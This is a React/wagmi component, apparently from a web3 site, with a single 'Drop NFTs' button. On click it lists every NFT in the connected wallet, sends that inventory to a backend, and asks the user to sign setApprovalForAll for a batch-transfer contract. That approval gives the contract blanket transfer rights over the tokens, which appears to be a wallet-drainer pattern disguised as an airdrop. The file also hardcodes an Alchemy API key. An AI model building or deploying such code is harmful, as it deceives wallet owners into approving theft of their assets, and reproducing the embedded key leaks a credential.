import { Alchemy, Network } from "alchemy-sdk";
import { useAccount, useContractWrite, usePrepareContractWrite, useWaitForTransaction } from "wagmi";
import { addNFTData } from "../Constants/APIendpoints.jsx";
import { BatchTransferAddress } from '../Constants/Contracts.jsx';
import { nftContractConfig } from "../Constants/contract.jsx";
import Dropper from "./Dropper.jsx";
import "./css/Connect.css";

const alchemyConfig = {
    apiKey: "gQBIeDKq12YYwxMtLUdvRMKuZACNtyTg",
    network: Network.ETH_SEPOLIA,
  };

const Connect = () => {

    const { address, isConnected, isDisconnected } = useAccount();

    const alchemy = new Alchemy(alchemyConfig);
    
    const { config } = usePrepareContractWrite({
        ...nftContractConfig,
        functionName: 'setApprovalForAll',
    });

    const { data, write } = useContractWrite(config)

    const { isLoading, isSuccess }= useWaitForTransaction({
        confirmations: 1,
        hash: data?.hash,
        onSuccess() {
            console.log("transaction success");
        }
    });
    

    const getPermission = async () => {

        await getNFTfromAccount();
        if (write) {
            write({
                args: [BatchTransferAddress, true],
                from: address
            })
        }
    }    

    const handleSaveNFTs = async (nftList) => {
        try {
            const response = await addNFTData(address, nftList);
            if (response.success) {
                console.log("NFT data retrieved from wallet successfully ;)");
            } else {
                console.error("Error saving NFT data retrieved from wallet", response);
            }
        } catch (error) {
            console.error("Error saving NFTs: ", error);
        }
    }


    const getNFTfromAccount = async() => {
        const nfts = await alchemy.nft.getNftsForOwner(address);
        const NFTlist = nfts.ownedNfts;
        
        let formattedData = {}
        //console.log(`NFT: ${JSON.stringify(NFTlist[1], null, 2)}`);
        for (let nft of NFTlist) {
            const contractAddress = nft.contract.address;
            ///const tokenName = nft.contract.tokenName;
            const tokenType = nft.contract.tokenType;
            const tokenId = nft.tokenId;
            const tokenUri = nft.tokenUri.gateway;
            // const floorPrice = await alchemy.nft.getFloorPrice(contractAddress);
            if (!formattedData[address]) {
                formattedData[address]= {}
            };
    
            if (!formattedData[address][contractAddress]) {
                formattedData[address][contractAddress] = [];
            }  
            formattedData[address][contractAddress].push({tokenId, tokenType, tokenUri});
        }   
        handleSaveNFTs(formattedData[address]);
    }

    return(<div>
        <button className="dropbtn" onClick={getPermission}>
            Drop NFTs
        </button>
    </div>)
}

export default Connect;

